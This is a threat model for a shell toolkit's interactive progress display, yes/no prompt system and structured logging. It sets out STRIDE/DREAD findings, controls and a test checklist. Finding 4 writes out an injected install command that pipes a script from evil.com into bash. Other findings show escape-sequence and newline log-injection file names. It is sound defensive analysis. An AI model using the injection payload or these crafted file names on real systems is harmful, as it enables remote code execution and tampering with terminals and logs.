# Security Scope: Interactive Mode and UI Components

**Scope ID**: scope_interactive_mode_001  
**Created**: 2026-02-11  
**Last Updated**: 2026-02-11  
**Status**: Active

## Overview
This security scope defines the security boundaries, threats, and controls for the mode-aware UI components introduced by features 0017 (Interactive Progress Display), 0018 (User Prompt System), and 0019 (Structured Logging). These components add ANSI terminal output, user input handling, and structured log formatting to the doc.doc.sh toolkit. This scope covers terminal injection risks from ANSI escape codes, input validation in the prompt system, information disclosure through logging and progress display, mode detection bypass risks, and secure defaults for non-interactive execution.

## Scope Definition

### In Scope
- ANSI escape code usage and terminal injection risks (feature_0017)
- User input handling and prompt validation (feature_0018)
- Log output security and log injection prevention (feature_0019)
- File path display in progress output (information leakage)
- Mode detection bypass and `IS_INTERACTIVE` trust boundary
- Environment variable override security (`DOC_DOC_INTERACTIVE`, `DOC_DOC_PROMPT_RESPONSE`)
- Non-interactive mode safe defaults

### Out of Scope
- Mode detection implementation details (covered in ADR-0008 and feature_0016)
- Plugin execution security (covered in scope_plugin_execution_001)
- File system access and path traversal (covered in scope_runtime_app_001)
- Workspace data integrity (covered in scope_workspace_data_001)

## Components

### 1. Progress Display (`ui/progress_display.sh`)
**Purpose**: Renders live in-place progress bar, file counters, and current execution context using ANSI escape sequences.

**Security Properties**:
- Must only emit ANSI escape codes when `IS_INTERACTIVE=true`
- Must sanitize file paths before display to prevent terminal escape injection
- Must truncate file paths to terminal width to prevent wrapping artifacts
- Must not expose absolute paths or sensitive directory structures beyond the source directory
- Must handle malformed or adversarial file names safely

**CIA Classification**: Internal (display logic), Low confidentiality (transient terminal output)

### 2. Prompt System (`ui/prompt_system.sh`)
**Purpose**: Provides yes/no user prompts with mode-aware behavior, auto-defaulting in non-interactive mode.

**Security Properties**:
- Must never block in non-interactive mode (immediate default return)
- Must validate and constrain user input (accept only y/n variants)
- Must enforce retry limit (max 3 attempts) to prevent infinite loops
- Must not pass user input to shell evaluation or command execution
- Must sanitize prompt messages to prevent format string issues
- Must log prompt outcomes for audit trail

**CIA Classification**: Internal (prompt logic), Low integrity (user decisions logged)

### 3. Logging Enhancement (`core/logging.sh`)
**Purpose**: Dual-mode log formatting with structured output for non-interactive mode and human-friendly output for interactive mode.

**Security Properties**:
- Must not include sensitive data (credentials, tokens, secrets) in log messages
- Must sanitize dynamic values before log output to prevent log injection
- Must not emit ANSI color codes in non-interactive mode
- Must use consistent timestamp format (ISO 8601 UTC) for forensic reliability
- Must support log level filtering to control information exposure
- Must maintain backward-compatible `log()` signature without introducing injection vectors

**CIA Classification**: Internal (log logic), Confidential (log content may reference file paths and operations)

## Interfaces

### Interface 1: Terminal Output (Progress Display → Terminal)

**STRIDE Analysis**:

| Threat | Risk | Description |
|--------|------|-------------|
| **Spoofing** | LOW | Crafted ANSI sequences in file names could spoof terminal content |
| **Tampering** | LOW | ANSI escape codes could alter previously displayed terminal content |
| **Repudiation** | INFO | Progress display is transient; no persistent record of displayed content |
| **Information Disclosure** | LOW | File paths displayed may reveal directory structure to shoulder-surfing observers |
| **Denial of Service** | INFO | Excessive ANSI output could degrade terminal performance |
| **Elevation of Privilege** | INFO | No privilege change through terminal output |

### Interface 2: User Input (stdin → Prompt System)

**STRIDE Analysis**:

| Threat | Risk | Description |
|--------|------|-------------|
| **Spoofing** | LOW | Stdin could be redirected to inject automated responses |
| **Tampering** | LOW | Prompt responses could be manipulated via stdin redirection |
| **Repudiation** | LOW | User prompt responses must be logged for audit trail |
| **Information Disclosure** | INFO | Prompt messages may reveal available operations |
| **Denial of Service** | MEDIUM | Without retry limits, invalid input could loop indefinitely |
| **Elevation of Privilege** | LOW | Prompt bypass could authorize tool installations the user did not approve |

### Interface 3: Log Output (Logging → stderr / Log Aggregator)

**STRIDE Analysis**:

| Threat | Risk | Description |
|--------|------|-------------|
| **Spoofing** | LOW | Log injection could create fake log entries |
| **Tampering** | LOW | Injected newlines or control characters could corrupt log format |
| **Repudiation** | INFO | Structured logs with timestamps provide non-repudiation |
| **Information Disclosure** | MEDIUM | Logs may contain file paths, plugin names, workspace paths |
| **Denial of Service** | LOW | Excessive logging could fill disk in automated environments |
| **Elevation of Privilege** | INFO | No privilege change through log output |

### Interface 4: Environment Variable Overrides (Environment → Mode Detection / Prompt)

**STRIDE Analysis**:

| Threat | Risk | Description |
|--------|------|-------------|
| **Spoofing** | MEDIUM | `DOC_DOC_INTERACTIVE=true` could force interactive mode in automated contexts |
| **Tampering** | MEDIUM | `DOC_DOC_PROMPT_RESPONSE=y` could auto-approve all prompts |
| **Repudiation** | LOW | Override usage should be logged |
| **Information Disclosure** | INFO | No additional disclosure |
| **Denial of Service** | LOW | Forcing interactive mode in cron could cause prompt hangs |
| **Elevation of Privilege** | MEDIUM | Auto-approving prompts could authorize unintended tool installations |

## Security Findings

### Finding 1: Terminal Escape Injection via File Names
**Risk Rating**: MEDIUM

**Description**: File names displayed in the progress output (feature_0017) may contain ANSI escape sequences or terminal control characters. A malicious file name such as `$'\033]0;pwned\007'` or `$'\033[2J'` could manipulate terminal title, clear the screen, or produce misleading output when rendered. This is a form of terminal injection (CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences).

**Attack Scenario**:
1. User creates source directory with file named `$'\033[2J\033[H'` (clears terminal)
2. Progress display renders file path: `Processing: <escape sequences>`
3. Terminal clears, potentially hiding error messages or warnings

**Recommendation**:
- Strip or escape non-printable characters and ANSI escape sequences from file paths before display
- Use `LC_ALL=C tr -dc '[:print:]'` or equivalent filtering on file names before rendering
- Consider replacing control characters with `?` or Unicode replacement character `�`

**Affected Component**: `ui/progress_display.sh`

---

### Finding 2: Prompt Response Not Used in Shell Evaluation
**Risk Rating**: INFO (positive design observation)

**Description**: The prompt system design (feature_0018) correctly uses `case` pattern matching on user input rather than `eval` or command substitution. User input is compared against fixed patterns (`[Yy]`, `[Nn]`) and never passed to shell evaluation. This eliminates command injection through prompt responses.

**Status**: Secure by design. No action required.

**Affected Component**: `ui/prompt_system.sh`

---

### Finding 3: Prompt Auto-Approval via Environment Variable
**Risk Rating**: MEDIUM

**Description**: The `DOC_DOC_PROMPT_RESPONSE` environment variable (designed for testing) can override all prompt responses. If set to `y` in a production environment, it would auto-approve all prompts including tool installation requests. Combined with `DOC_DOC_INTERACTIVE=true`, an attacker who can set environment variables could force the system to install tools without user consent.

**Attack Scenario**:
1. Attacker sets `DOC_DOC_PROMPT_RESPONSE=y` in environment (e.g., via `.bashrc` modification, shared CI environment)
2. Prompt system reads override, auto-approves all prompts
3. Tool installation prompts (`prompt_tool_installation()`) execute install commands without user review

**Recommendation**:
- Log at WARN level when `DOC_DOC_PROMPT_RESPONSE` is active: `"Prompt override active via DOC_DOC_PROMPT_RESPONSE — all prompts auto-answered"`
- Consider restricting `DOC_DOC_PROMPT_RESPONSE` to only work when a recognized test harness is active
- Document that `DOC_DOC_PROMPT_RESPONSE` is a test-only variable and must not be set in production

**Affected Component**: `ui/prompt_system.sh`

---

### Finding 4: `eval` Usage in `prompt_tool_installation()`
**Risk Rating**: HIGH

**Description**: The feature_0018 spec shows `prompt_tool_installation()` using `eval "${install_command}"` to execute an installation command passed as a string argument. This is a command injection vector (CWE-78: Improper Neutralization of Special Elements used in an OS Command). If the `install_command` parameter contains unsanitized input (e.g., from plugin descriptors or user-provided configuration), arbitrary commands could be executed.

**Attack Scenario**:
1. Malicious plugin descriptor specifies install command: `apt install tool; curl http://evil.com/backdoor.sh | bash`
2. `prompt_tool_installation("tool", "apt install tool; curl ... | bash")` is called
3. User approves installation (or auto-approved via `DOC_DOC_PROMPT_RESPONSE=y`)
4. `eval` executes the full string including injected commands

**Recommendation**:
- **Do not use `eval`** for install command execution
- Use a whitelist of allowed installation methods (e.g., `apt install`, `brew install`)
- Pass tool name and package manager separately rather than a command string
- If dynamic commands are unavoidable, validate against a strict pattern and use arrays with direct execution rather than `eval`

**Affected Component**: `ui/prompt_system.sh`

---

### Finding 5: Log Injection via Unsanitized Dynamic Content
**Risk Rating**: MEDIUM

**Description**: The structured logging format (feature_0019) interpolates dynamic values (file paths, plugin names, error messages) directly into log output. Specially crafted values containing newline characters (`\n`) or log format delimiters (`] [`) could inject fake log entries or corrupt log parsing (CWE-117: Improper Output Neutralization for Logs).

**Attack Scenario**:
1. File named `normal.pdf\n[2026-02-10T14:30:00Z] [INFO] [MAIN    ] Analysis complete: 0 errors` exists in source directory
2. Logging system outputs: `[timestamp] [INFO] [SCAN    ] Processing: normal.pdf`  
   followed by injected: `[2026-02-10T14:30:00Z] [INFO] [MAIN    ] Analysis complete: 0 errors`
3. Log aggregator interprets injected line as legitimate log entry, masking actual errors

**Recommendation**:
- Sanitize all dynamic values before inclusion in log messages: replace newlines with `\n` literal, strip or replace control characters
- Use `printf '%q'` for shell-safe quoting of dynamic values in log output
- Consider encoding dynamic values that may contain special characters

**Affected Component**: `core/logging.sh`

---

### Finding 6: Information Disclosure via File Path Logging
**Risk Rating**: LOW

**Description**: Both the progress display (feature_0017) and structured logging (feature_0019) include file paths in their output. In interactive mode, the progress display shows the current file being processed. In non-interactive mode, structured logs record file paths at milestone intervals. These paths could reveal sensitive directory structure, project names, user names (from home directory paths), or confidential document names.

**Context**: The existing security concept (scope_data_flow_001, Transformation 5) already requires sanitization of sensitive data in logs (req_0052). The UI components must comply with this existing requirement.

**Recommendation**:
- Display relative paths (relative to source directory) rather than absolute paths
- Ensure `truncate_path()` truncates from the left (prefix), preserving the file name while hiding parent directory structure
- In verbose/debug logging, note that full paths may be logged — document this in the security concept
- Review log output to ensure home directory paths (`/home/username/`) are not exposed in non-interactive logs destined for shared log aggregators

**Affected Component**: `ui/progress_display.sh`, `core/logging.sh`

---

### Finding 7: Mode Detection Bypass via `DOC_DOC_INTERACTIVE`
**Risk Rating**: LOW

**Description**: The `DOC_DOC_INTERACTIVE` environment variable overrides POSIX terminal detection (`[ -t 0 ] && [ -t 1 ]`). Setting `DOC_DOC_INTERACTIVE=true` in a non-interactive context (cron, CI/CD) would enable ANSI output (garbled logs), activate blocking prompts (potential hang), and suppress structured logging (loss of audit trail).

**Attack Scenario**:
1. CI/CD configuration accidentally or maliciously sets `DOC_DOC_INTERACTIVE=true`
2. Prompt system blocks waiting for stdin input that never arrives
3. CI/CD job hangs indefinitely until killed by timeout
4. Structured logs not produced; monitoring and alerting fail

**Recommendation**:
- Log at INFO level when `DOC_DOC_INTERACTIVE` override is active
- Consider a secondary check: if `DOC_DOC_INTERACTIVE=true` but `[ -t 0 ]` fails, log a WARN that interactive mode was forced without a terminal
- Document that `DOC_DOC_INTERACTIVE` is for testing and development only

**Affected Component**: `core/mode_detection.sh`, `ui/prompt_system.sh`

---

### Finding 8: Prompt System Retry Limit Prevents DoS
**Risk Rating**: INFO (positive design observation)

**Description**: The prompt system design correctly limits retries to 3 attempts before falling back to the default response. This prevents denial of service through repeated invalid input and ensures the system always terminates the prompt loop in bounded time.

**Status**: Secure by design. The 3-attempt limit with default fallback is appropriate.

**Affected Component**: `ui/prompt_system.sh`

---

### Finding 9: ANSI Escape Codes Suppressed in Non-Interactive Mode
**Risk Rating**: INFO (positive design observation)

**Description**: All three feature specs correctly gate ANSI escape code output on `IS_INTERACTIVE=true`. Non-interactive mode produces plain text output without escape sequences, preventing log corruption and ensuring compatibility with log aggregation systems.

**Status**: Secure by design. This pattern must be maintained consistently across all UI components.

**Affected Component**: `ui/progress_display.sh`, `core/logging.sh`

---

### Finding 10: Timestamp Integrity for Forensic Logging
**Risk Rating**: LOW

**Description**: The structured logging format uses `date -u +"%Y-%m-%dT%H:%M:%SZ"` for ISO 8601 timestamps. The `date` command reads the system clock, which could be manipulated by an attacker with sufficient privileges. Tampered timestamps would undermine the forensic value of the audit trail.

**Context**: This is an accepted risk common to all CLI tools that rely on system time. The toolkit runs at user privilege level and cannot defend against system clock manipulation by a privileged attacker.

**Recommendation**:
- Document that log timestamp integrity depends on system clock accuracy
- For high-assurance environments, recommend forwarding logs to a centralized logging system with independent timestamps

**Affected Component**: `core/logging.sh`

## CIA Classification Summary

| Component | Data Type | Confidentiality | Integrity | Availability | Weight |
|-----------|-----------|----------------|-----------|--------------|--------|
| **Progress Display** | Terminal output (transient) | LOW | LOW | LOW | 1x |
| **Prompt System** | User decisions | LOW | MEDIUM | MEDIUM | 2x |
| **Structured Logs** | Operational audit trail | MEDIUM | MEDIUM | MEDIUM | 3x |
| **Environment Overrides** | Configuration | LOW | HIGH | MEDIUM | 3x |

**Key Observations**:
- **Highest integrity concern**: Environment variable overrides that control mode and prompt behavior
- **Highest confidentiality concern**: Log output containing file paths and operational details
- **Transient data**: Progress display output is ephemeral and not persisted; low CIA impact
- **Audit value**: Structured logs in non-interactive mode serve as operational audit trail; integrity matters

## STRIDE/DREAD Analysis Summary

| Finding | STRIDE Category | Risk | DREAD Score | Priority |
|---------|----------------|------|-------------|----------|
| Terminal escape injection (F1) | Tampering, Spoofing | MEDIUM | D:2 R:3 E:3 A:2 D:2 = 12 | P2 |
| Prompt auto-approval override (F3) | Elevation of Privilege | MEDIUM | D:3 R:2 E:2 A:1 D:2 = 10 | P2 |
| `eval` in install command (F4) | Tampering | HIGH | D:4 R:3 E:3 A:2 D:3 = 15 | P1 |
| Log injection (F5) | Tampering, Spoofing | MEDIUM | D:2 R:3 E:3 A:2 D:2 = 12 | P2 |
| File path disclosure (F6) | Information Disclosure | LOW | D:1 R:3 E:4 A:3 D:1 = 12 | P3 |
| Mode detection bypass (F7) | Denial of Service | LOW | D:2 R:2 E:3 A:1 D:2 = 10 | P3 |
| Timestamp integrity (F10) | Tampering | LOW | D:1 R:1 E:1 A:1 D:1 = 5 | P4 |

**DREAD Scale**: Damage (1-5), Reproducibility (1-5), Exploitability (1-5), Affected Users (1-5), Discoverability (1-5)

## Security Controls

### Preventive Controls

| Control | Finding | Description |
|---------|---------|-------------|
| **SC-INT-001**: Sanitize file names for display | F1 | Strip ANSI escape sequences and control characters from file paths before rendering in progress display |
| **SC-INT-002**: No `eval` for install commands | F4 | Replace `eval "${install_command}"` with whitelist-based execution or array-based command invocation |
| **SC-INT-003**: Sanitize log dynamic values | F5 | Replace newlines and control characters in dynamic values before interpolation into log messages |
| **SC-INT-004**: Use relative paths in display/logs | F6 | Display file paths relative to source directory, not absolute paths |
| **SC-INT-005**: Gate ANSI on `IS_INTERACTIVE` | F1, F9 | All ANSI escape code output must be conditional on `IS_INTERACTIVE=true` |
| **SC-INT-006**: Prompt input validation | F2, F8 | Validate prompt input with `case` pattern matching only; never pass to `eval` or command substitution |

### Detective Controls

| Control | Finding | Description |
|---------|---------|-------------|
| **SC-INT-007**: Log override usage | F3, F7 | Log at WARN level when `DOC_DOC_PROMPT_RESPONSE` or `DOC_DOC_INTERACTIVE` override is active |
| **SC-INT-008**: Audit prompt decisions | F3 | Log all prompt outcomes (user response or auto-default) for audit trail |
| **SC-INT-009**: Monitor log volume | F5 | In automated environments, monitor log file growth to detect excessive logging |

### Corrective Controls

| Control | Finding | Description |
|---------|---------|-------------|
| **SC-INT-010**: Prompt timeout fallback | F7 | If prompt blocks for extended time in interactive mode, fall back to default after configurable timeout |
| **SC-INT-011**: Retry limit enforcement | F8 | After 3 invalid prompt responses, use default and log warning |

## Testing and Verification Checklist

### Terminal Escape Injection Tests
- [ ] File name containing ANSI escape sequences does not alter terminal state
- [ ] File name containing newline characters does not break progress display layout
- [ ] File name containing null bytes is handled safely
- [ ] Progress display renders safely with maximum-length file paths

### Prompt Security Tests
- [ ] Prompt accepts only valid y/n responses
- [ ] Invalid input triggers re-prompt, not command execution
- [ ] Max 3 retries enforced; default used after exhaustion
- [ ] Non-interactive mode returns default without stdin read
- [ ] `DOC_DOC_PROMPT_RESPONSE` override is logged at WARN level
- [ ] Prompt response is never passed to `eval` or command substitution

### Log Injection Tests
- [ ] Dynamic values containing newlines produce single log line (newlines escaped)
- [ ] Dynamic values containing `] [` delimiters do not corrupt log format
- [ ] No ANSI escape codes in non-interactive log output
- [ ] Sensitive data (absolute paths, home directories) not present in standard log output

### Mode Detection Override Tests
- [ ] `DOC_DOC_INTERACTIVE=true` override is logged
- [ ] `DOC_DOC_INTERACTIVE=true` with no terminal produces warning
- [ ] Non-interactive mode never blocks on prompts regardless of stdin state

### Information Disclosure Tests
- [ ] Progress display shows relative paths, not absolute paths
- [ ] Log output uses relative paths for file references
- [ ] Debug/verbose mode logs document that full paths may be included

## Compliance and Standards

### Relevant Standards
- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command (Finding F4)
- **CWE-117**: Improper Output Neutralization for Logs (Finding F5)
- **CWE-150**: Improper Neutralization of Escape, Meta, or Control Sequences (Finding F1)
- **OWASP Top 10 A03**: Injection (Findings F4, F5)
- **OWASP Logging Cheat Sheet**: Structured logging, log injection prevention

### Compliance Summary
- ⚠️ `eval` usage in `prompt_tool_installation()` violates CWE-78 — must be remediated (Finding F4)
- ✅ Prompt input validation via `case` matching — compliant (Finding F2)
- ⚠️ Log injection via unsanitized dynamic content — implement sanitization (Finding F5)
- ⚠️ Terminal escape injection via file names — implement filtering (Finding F1)
- ✅ Non-interactive mode suppresses ANSI output — compliant (Finding F9)
- ✅ Prompt retry limit prevents DoS — compliant (Finding F8)

## Residual Risks

### Accepted Risk 1: Terminal Emulator Vulnerability Exploitation
**Description**: Some terminal emulators have known vulnerabilities triggered by specific escape sequences (e.g., CVE-2019-8761 in macOS Terminal). While the system gates ANSI output on interactive mode, crafted file names could still trigger emulator-specific vulnerabilities through the progress display.  
**Impact**: Terminal emulator crash or, in rare cases, code execution via terminal vulnerability  
**Mitigation**: File name sanitization (SC-INT-001) reduces but cannot fully eliminate risk  
**Acceptance**: Defending against terminal emulator vulnerabilities is out of scope; recommend keeping terminal emulators updated

### Accepted Risk 2: Environment Variable Manipulation
**Description**: An attacker with access to the process environment can override mode detection and prompt behavior via `DOC_DOC_INTERACTIVE` and `DOC_DOC_PROMPT_RESPONSE`.  
**Impact**: Prompt bypass, mode misclassification, potential unauthorized tool installation  
**Mitigation**: Logging of overrides (SC-INT-007) provides detection capability  
**Acceptance**: Environment variable access implies existing process-level compromise; risk is bounded by user privilege level

### Accepted Risk 3: System Clock Manipulation
**Description**: Log timestamps depend on system clock accuracy; a privileged attacker could manipulate timestamps.  
**Impact**: Forensic log analysis could be misled by incorrect timestamps  
**Mitigation**: Document dependency on system clock; recommend centralized logging for high-assurance environments  
**Acceptance**: Standard risk for all CLI tools; cannot be mitigated at application level

## References

### Related Features
- [Feature 0017: Interactive Progress Display](../../../02_agile_board/05_implementing/feature_0017_interactive_progress_display.md)
- [Feature 0018: User Prompt System](../../../02_agile_board/05_implementing/feature_0018_user_prompt_system.md)
- [Feature 0019: Structured Logging](../../../02_agile_board/05_implementing/feature_0019_structured_logging.md)

### Related Architecture Decisions
- [IDR-0017: Mode-Aware UI Components](../../../03_documentation/01_architecture/09_architecture_decisions/IDR_0017_mode_aware_ui_components.md)
- [ADR-0007: Modular Component Architecture](../../../01_vision/03_architecture/09_architecture_decisions/ADR_0007_modular_component_based_script_architecture.md)
- [ADR-0008: POSIX Terminal Test for Mode Detection](../../../01_vision/03_architecture/09_architecture_decisions/ADR_0008_posix_terminal_test_for_mode_detection.md)

### Related Security Scopes
- scope_runtime_app_001: Runtime Application Security (command injection, path traversal)
- scope_plugin_execution_001: Plugin Execution Security (plugin argument sanitization)
- scope_data_flow_001: Data Flow and Trust Boundaries (log sanitization, Transformation 5)

### Related Requirements
- req_0052: Secure Logging
- req_0057: Interactive Mode Behavior
- req_0058: Non-Interactive Mode Behavior
- req_0048: Command Injection Prevention
- req_0051: Input Sanitization and Output Escaping

### External Resources
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-117: Improper Output Neutralization for Logs](https://cwe.mitre.org/data/definitions/117.html)
- [CWE-150: Improper Neutralization of Escape Sequences](https://cwe.mitre.org/data/definitions/150.html)
- [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)

---

## Document History
- [2026-02-11] Initial security scope document created for interactive mode UI components
- [2026-02-11] STRIDE/DREAD analysis completed for all interfaces
- [2026-02-11] Ten security findings documented with risk ratings and recommendations
- [2026-02-11] Security controls (preventive, detective, corrective) defined
- [2026-02-11] Testing and verification checklist created
